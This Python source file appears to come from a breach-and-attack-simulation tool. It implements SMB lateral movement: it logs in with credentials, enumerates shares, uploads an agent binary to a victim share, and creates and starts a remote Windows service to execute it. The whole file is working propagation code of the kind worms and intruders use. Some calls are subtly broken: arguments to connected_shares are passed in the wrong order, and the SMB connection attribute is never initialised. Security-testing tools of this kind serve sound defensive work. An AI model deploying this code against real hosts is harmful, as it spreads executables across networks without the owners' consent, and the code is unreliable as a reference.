import logging
import ntpath
from io import BytesIO
from pathlib import PurePath
from typing import Any, Dict, Optional, Sequence, Tuple

from impacket.dcerpc.v5 import scmr, srvs, transport
from impacket.dcerpc.v5.rpcrt import DCERPC_v5

from common.credentials import Credentials
from common.event_queue import IAgentEventPublisher
from infection_monkey.i_puppet import TargetHost

from .smb_command_builder import build_smb_command
from .smb_options import SMBOptions
from .smb_utils import create_smb_connection, rpc_connect, smb_login

logger = logging.getLogger(__name__)


SERVICE_NAME = "InfectionMonkey"


class SMBPropagationClient:
    """Manages the RPC/SMB connection, Propagation events"""

    def __init__(self, agent_event_publisher: IAgentEventPublisher):
        self._agent_event_publisher = agent_event_publisher

    def copy_file(
        self,
        host: TargetHost,
        file: BytesIO,
        path: PurePath,
        credentials: Credentials,
    ) -> Optional[str]:
        if not self.query_server_info():
            return None

        shares = self.query_shares(host, path)
        for remote_path, share_name, share_path in self.connected_shares(host, shares, credentials):
            destination = self.copy_agent_binary(file, host, remote_path, share_name, share_path)
            if destination:
                return destination

        return None

    def run_agent(
        self,
        host: TargetHost,
        path: str,
        dest_path: str,
        servers: Sequence[str],
        current_depth: int,
        credentials: Credentials,
        options: SMBOptions,
    ) -> bool:
        rpc = self._connect_rpc(host, credentials, options.smb_connect_timeout)
        command = build_smb_command(servers, current_depth, path, dest_path)

        rpc.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(rpc)
        sc_handle = resp["lpScHandle"]

        try:
            resp = scmr.hRCreateServiceW(
                rpc,
                sc_handle,
                SERVICE_NAME,
                SERVICE_NAME,
                lpBinaryPathName=command,
            )
        except scmr.DCERPCSessionError as err:
            if err.error_code == 0x431:
                logger.debug(f"Service '{SERVICE_NAME}' already exists, trying to start it")
                resp = scmr.hROpenServiceW(rpc, sc_handle, SERVICE_NAME)
            else:
                return False

        service_handle = resp["lpServiceHandle"]
        try:
            scmr.hRStartServiceW(rpc, service_handle)
        except Exception:
            return False

        scmr.hRDeleteService(rpc, service_handle)
        scmr.hRCloseServiceHandle(rpc, service_handle)

        return True

    def query_shares(self, host: TargetHost, path: PurePath):
        resp = self._query_shared_resources()
        if not resp:
            return ()

        high_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        low_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        file_name = path.name

        for i in range(len(resp)):
            share_name = resp[i]["shi2_netname"].strip("\0 ")
            share_path = resp[i]["shi2_path"].strip("\0 ")
            current_uses = resp[i]["shi2_current_uses"]
            max_uses = resp[i]["shi2_max_uses"]

            if current_uses >= max_uses:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because max uses is exceeded",
                    host,
                )
                continue
            elif not share_path:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because share path is invalid",
                    host,
                )
                continue

            share_info = {"share_name": share_name, "share_path": share_path}

            if str(path).lower().startswith(share_path.lower()):
                high_priority_shares += ((ntpath.sep + str(path)[len(share_path) :], share_info),)

            low_priority_shares += ((ntpath.sep + file_name, share_info),)

        return high_priority_shares + low_priority_shares

    def _query_shared_resources(self):
        try:
            shares = self._execute_rpc_call(srvs.hNetrShareEnum, 2)
        except Exception as err:
            logger.debug(f"Failed to query shared resources: {err}")
            return None

        return shares

    def connected_shares(self, shares, host: TargetHost, credentials: Credentials):
        """Yields a tuple of (remote_path, share_name, share_path)
        Side effect: the SMBConnection is connected to the share"""
        # Attempt to connect to a share over SMB
        for remote_path, share in shares:
            share_name = share["share_name"]
            share_path = share["share_path"]

            # TODO: Do we really need to handle reconnects?
            if not self._smb:
                self.connect_with_user(host, credentials)
                if not self._smb:
                    break

            try:
                self._smb.connectTree(share_name)
            except Exception as exc:
                logger.error(
                    f'Error connecting tree to share "{share_name}" on victim {host}: {exc}'
                )
                continue

            yield remote_path, share_name, share_path

    def connect_with_user(self, host: TargetHost, credentials: Credentials) -> bool:
        self._smb = create_smb_connection(host)
        if not self._smb:
            return False

        self._smb = smb_login(self._smb, credentials)
        if not self._smb:
            return False

        return True

    def copy_agent_binary(
        self,
        agent_binary: BytesIO,
        host: TargetHost,
        remote_path: str,
        share_name: str,
        share_path: str,
    ) -> Optional[str]:
        logger.debug(
            f"Trying to copy monkey file to share '{share_name}' [%s + %s] on victim {host}",
            share_path,
            remote_path,
        )

        if not self._smb:
            return None

        try:
            # TODO: Use config timeout value
            # self._smb.setTimeout(timeout)
            self._smb.putFile(share_name, remote_path, agent_binary.read)

            logger.info(
                f"Copied monkey agent to remote share '{share_name}' "
                f"[{share_path}] on victim {host}"
            )

            return ntpath.join(share_path, remote_path.strip(ntpath.sep))
        except Exception as exc:
            logger.error(f"Error uploading monkey to share '{share_name}' on victim {host}: {exc}")
            return None

    def query_server_info(self):
        try:
            info = self._execute_rpc_call(srvs.hNetrServerGetInfo, 102)
        except Exception as err:
            logger.debug(f"Failed to query server info: {err}")
            return None

        return info

    def _execute_rpc_call(self, rpc_func, *args):
        """Executes an RPC call using DCE/RPC"""
        dce = self._get_dce_bind()

        return rpc_func(dce, *args)

    def _get_dce_bind(self) -> DCERPC_v5:
        """Creates a DCE/RPC connection over an existing SMB connection"""
        rpctransport = transport.SMBTransport(
            self._smb.getRemoteHost(),
            self._smb.getRemoteHost(),
            filename=r"\srvsvc",
            smb_connection=self._smb,
        )
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)

        return dce

    def _connect_rpc(self, host, credentials, timeout):
        return rpc_connect(host, 139, credentials, timeout) or rpc_connect(
            host, 445, credentials, timeout
        )
